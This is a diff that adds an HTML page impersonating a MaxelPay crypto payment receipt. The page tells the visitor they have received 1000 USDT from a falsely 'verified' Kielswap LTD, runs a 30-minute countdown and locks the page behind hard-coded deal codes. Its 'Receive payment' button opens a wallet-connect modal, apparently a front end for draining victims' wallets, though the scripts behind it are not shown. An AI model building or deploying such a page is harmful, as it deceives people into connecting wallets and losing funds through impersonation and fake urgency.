@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Crypto Payment Receipt - USDT Ethereum</title>
+    <link rel="stylesheet" href="/styles.css">
+    <script>
+        (function() {
+            try {
+                var path = location.pathname || '';
+                var hash = (location.hash || '').replace(/^#/, '');
+                var raw = path.indexOf('/dealid/') !== -1 ? path : hash;
+                var match = raw.match(/\/dealid\/([A-Za-z0-9]{15})\/?$/);
+                var key = match ? 'maxelpay_paymentSession_' + match[1].toUpperCase() : 'maxelpay_paymentSession';
+                var s = localStorage.getItem(key);
+                if (s) {
+                    var session = JSON.parse(s);
+                    if (session && session.unlocked) document.documentElement.classList.add('deal-code-unlocked');
+                }
+            } catch (e) {}
+        })();
+    </script>
+    <script type="module" defer crossorigin src="/after.js"></script>
+</head>
+<body>
+    <div class="deal-code-overlay" id="dealCodeOverlay">
+        <div class="deal-code-panel">
+            <h2 class="deal-code-title">Enter deal code</h2>
+            <p class="deal-code-subtitle">Please enter the code provided by the payer.</p>
+            <form class="deal-code-form" id="dealCodeForm">
+                <input type="text" class="deal-code-input" id="dealCodeInput" placeholder="Enter code" maxlength="8" autocomplete="off">
+                <button type="submit" class="deal-code-submit">Continue</button>
+            </form>
+            <p class="deal-code-error" id="dealCodeError"></p>
+        </div>
+    </div>
+    
+    <div class="container content-blurred" id="mainContent">
+        <div class="payment-card">
+            <!-- Left Section -->
+            <div class="left-section">
+                <div class="header">
+                    <img src="/maxelpay-logo-light.svg" alt="MaxelPay" class="logo-img">
+                    <p class="info-text">You recieved a payment. Please review the details below and confirm receipt.</p>
+                </div>
+                
+                <div class="qr-container">
+                    <div class="qr-code" id="qrCode">
+                        <img src="/qrcode.png" alt="QR Code" class="qr-logo">
+                    </div>
+                </div>
+                
+                <div class="sender-info">
+                    <div class="label">From</div>
+                    <div class="sender-name">
+                        <img src="/kielswap1.png" alt="Kielswap" class="sender-logo">
+                        <span class="sender-text">Kielswap LTD.</span>
+                        <span class="verified-badge">
+                            <img src="/approval-xl.png" alt="Verified" class="verified-icon-img">
+                            <span class="verified-tooltip">Verified organization</span>
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="recipient-info">
+                    <div class="label">Recipient address</div>
+                    <div class="address" id="recipientAddress">0x4838b106fce9647b...</div>
+                </div>
+                
+                <div class="recipient-email">
+                    <div class="label"></div>
+                    <div class="email-address"></div>
+                </div>
+            </div>
+            
+            <!-- Right Section -->
+            <div class="right-section">
+                <div class="invoice-header">
+                    <h2>Invoice Details</h2>
+                    <div class="status-container">
+                        <span class="status-label">Status</span>
+                        <span class="status-badge pending" id="statusBadge">Pending</span>
+                        <span class="timer" id="timer">30:00</span>
+                    </div>
+                </div>
+                
+                <div class="payment-methods">
+                    <div class="label">Payment Method</div>
+                    <div class="methods-list">
+                        <div class="method-item">
+                            <img src="https://assets.coingecko.com/coins/images/325/standard/Tether.png" alt="USDT" class="crypto-icon usdt">
+                            <span class="method-name usdt">USDT</span>
+                        </div>
+                        <div class="method-item">
+                            <img src="https://assets.coingecko.com/coins/images/279/standard/ethereum.png" alt="Ethereum" class="crypto-icon ethereum">
+                            <span class="method-name ethereum">Ethereum Network</span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="invoice-breakdown">
+                    <div class="breakdown-header">
+                        <span class="col-label">Item Description</span>
+                        <span class="col-label">Subtotal</span>
+                    </div>
+                    <div class="breakdown-row">
+                        <span class="item-name">Promotion</span>
+                        <span class="item-amount">1000.00 USDT</span>
+                    </div>
+                    <div class="breakdown-row">
+                        <span class="item-name">Fee</span>
+                        <span class="item-amount">$0.00</span>
+                    </div>
+                </div>
+                
+                <div class="total-section">
+                    <span class="total-label">Total</span>
+                    <span class="total-amount">1000.00 USDT</span>
+                </div>
+                
+                <div class="transaction-meta">
+                    <span class="meta-item">Date: Jan 15, 2026</span>
+                    <span class="meta-item">ID: <span id="dealIdDisplay"></span></span>
+                </div>
+                
+                <button class="receive-button open-connect-modal" id="receiveButton">
+                    <span>Receive payment</span>
+                </button>
+                
+                <div class="footer">
+                    <div class="footer-text">Payment processed by MaxelPay</div>
+                    <div class="footer-links">
+                        <a href="https://www.maxelpay.com/privacy-policy" class="footer-link" target="_blank" rel="noopener noreferrer">Privacy Policy</a>
+                        <a href="https://www.maxelpay.com/terms-and-conditions" class="footer-link" target="_blank" rel="noopener noreferrer">Terms and Conditions</a>
+                        <a href="https://www.maxelpay.com/cookie-policy" class="footer-link" target="_blank" rel="noopener noreferrer">Cookie Policy</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <script src="/script.js"></script>
+    <script>
+        (function() {
+            var TIMER_DURATION_MS = 30 * 60 * 1000;
+
+            // 1 код = 1 dealId (20 кодов, 20 уникальных dealId по 15 символов)
+            var CODE_TO_DEALID = {
+                'A7F3K9R2': 'A7F3K9R2P5Q8Z1M',
+                'P5Q8Z1M4': 'M4T9B6N2D7X3L8G',
+                'T9B6N2D7': 'G5H0C4J9W2E6V7R',
+                'X3L8G5H0': 'R1Y8S5K2M4F6A9U',
+                'C4J9W2E6': 'U8P3D0Z1E5H7N3Q',
+                'V7R1Y8S5': 'Q8W6T4B9J2R4S6T',
+                'K2M4F6A9': 'T8U0V2W4X6Y8Z0A',
+                'U8P3D0Z1': 'A2B4C6D8E0F2G4H',
+                'E5H7N3Q8': 'H6I8J0K2L4M6N8O',
+                'W6T4B9J2': 'O0P2Q4R6S8T0U2V',
+                'R4S6T8U0': 'V4W6X8Y0Z2A4B6C',
+                'V2W4X6Y8': 'C8D0E2F4G6H8I0J',
+                'Z0A2B4C6': 'J2K4L6M8N0P2Q4R',
+                'D8E0F2G4': 'R6S8T0U2V4W6X8Y',
+                'H6I8J0K2': 'Y0Z2A4B6C8D0E2F',
+                'L4M6N8O0': 'F4G6H8I0J2K4L6M',
+                'P2Q4R6S8': 'M8N0P2Q4R6S8T0U',
+                'T0U2V4W6': 'U2V4W6X8Y0Z2A4B',
+                'X8Y0Z2A4': 'B6C8D0E2F4G6H8I',
+                'B6C8D0E2': 'I0J2K4L6M8N0P2Q'
+            };
+            var DEALID_TO_CODE = {};
+            for (var c in CODE_TO_DEALID) {
+                if (CODE_TO_DEALID.hasOwnProperty(c)) DEALID_TO_CODE[CODE_TO_DEALID[c]] = c;
+            }
+
+            // site.com/dealid/A7F3K9R2P5Q8Z1M — извлекаем dealId из path или hash
+            function getDealIdFromUrl() {
+                var path = location.pathname || '';
+                var hash = (location.hash || '').replace(/^#/, '');
+                var raw = (path.indexOf('/dealid/') !== -1) ? path : hash;
+                var match = raw.match(/\/dealid\/([A-Za-z0-9]{15})\/?$/);
+                if (match) return match[1].toUpperCase();
+                return null;
+            }
+
+            var dealIdFromUrl = getDealIdFromUrl();
+            var validDealId = dealIdFromUrl && DEALID_TO_CODE.hasOwnProperty(dealIdFromUrl);
+            var SESSION_BASE = 'maxelpay_paymentSession';
+            var SESSION_KEY = validDealId ? SESSION_BASE + '_' + dealIdFromUrl : SESSION_BASE;
+
+            function getSession() {
+                try {
+                    var s = localStorage.getItem(SESSION_KEY);
+                    return s ? JSON.parse(s) : {};
+                } catch (e) { return {}; }
+            }
+            function setSession(session) {
+                try {
+                    localStorage.setItem(SESSION_KEY, JSON.stringify(session));
+                } catch (e) {}
+            }
+
+            var session = getSession();
+            var dealIdEl = document.getElementById('dealIdDisplay');
+            if (validDealId) {
+                dealIdEl.textContent = dealIdFromUrl;
+            } else if (dealIdFromUrl) {
+                dealIdEl.textContent = 'Invalid link';
+            } else {
+                dealIdEl.textContent = (session.dealId && session.dealId.length === 15) ? session.dealId : '—';
+            }
+
+            var overlay = document.getElementById('dealCodeOverlay');
+            var form = document.getElementById('dealCodeForm');
+            var input = document.getElementById('dealCodeInput');
+            var errorEl = document.getElementById('dealCodeError');
+            var mainContent = document.getElementById('mainContent');
+
+            var isUnlocked = session.unlocked && (!validDealId || session.dealId === dealIdFromUrl);
+            if (isUnlocked) {
+                document.documentElement.classList.add('deal-code-unlocked');
+                overlay.classList.add('deal-code-hidden');
+                mainContent.classList.remove('content-blurred');
+            }
+
+            if (validDealId) {
+                document.body.classList.add('deal-by-url');
+            }
+            if (dealIdFromUrl && !validDealId) {
+                document.body.classList.add('deal-link-invalid');
+                form.style.display = 'none';
+                errorEl.textContent = 'Invalid or unknown deal link.';
+                errorEl.style.display = 'block';
+            }
+
+            form.addEventListener('submit', function(e) {
+                e.preventDefault();
+                var code = input.value.trim().toUpperCase();
+                errorEl.textContent = '';
+                var accepted = false;
+                var boundDealId = null;
+                if (validDealId) {
+                    if (code === DEALID_TO_CODE[dealIdFromUrl]) {
+                        accepted = true;
+                        boundDealId = dealIdFromUrl;
+                    }
+                } else if (!dealIdFromUrl && CODE_TO_DEALID.hasOwnProperty(code)) {
+                    accepted = true;
+                    boundDealId = CODE_TO_DEALID[code];
+                }
+                if (accepted && boundDealId) {
+                    session = getSession();
+                    session.unlocked = true;
+                    session.dealId = boundDealId;
+                    if (!session.timerEnd) {
+                        session.timerEnd = Date.now() + TIMER_DURATION_MS;
+                    }
+                    setSession(session);
+                    if (session.timerEnd) {
+                        document.dispatchEvent(new CustomEvent('paymentTimerStarted'));
+                    }
+                    dealIdEl.textContent = boundDealId;
+                    document.documentElement.classList.add('deal-code-unlocked');
+                    overlay.classList.add('deal-code-hidden');
+                    mainContent.classList.remove('content-blurred');
+                } else {
+                    errorEl.textContent = 'Invalid code. Please try again.';
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
